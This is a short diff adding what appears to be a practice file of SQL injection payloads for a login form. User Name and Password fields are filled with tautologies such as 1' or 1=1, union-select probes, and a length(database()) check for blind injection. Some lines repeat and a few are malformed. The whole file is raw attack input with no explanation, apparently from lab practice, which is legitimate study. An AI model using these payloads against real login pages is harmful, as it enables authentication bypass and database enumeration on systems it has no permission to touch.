@@ -1,0 +1,24 @@
+User Name:1") or union select 1,1 #
+Password:
+User Name:1' or 1=1 --+
+Password:
+User Name:1' or 1=1
+Password:
+User Name:1' or 1=1 #
+Password:
+User Name:1' or 1=1
+Password:
+User Name:1") or union select 1,1 #
+Password:
+User Name:1") or union select 1,1 #
+Password:
+User Name:1") or 1=1  #
+Password:
+User Name:
+Password:1" or 1=1 #
+User Name:
+Password:1") or length(database())=8 #
+User Name:
+Password:1" or 1=1 #
+User Name:
+Password:1" or length(database())=8 #
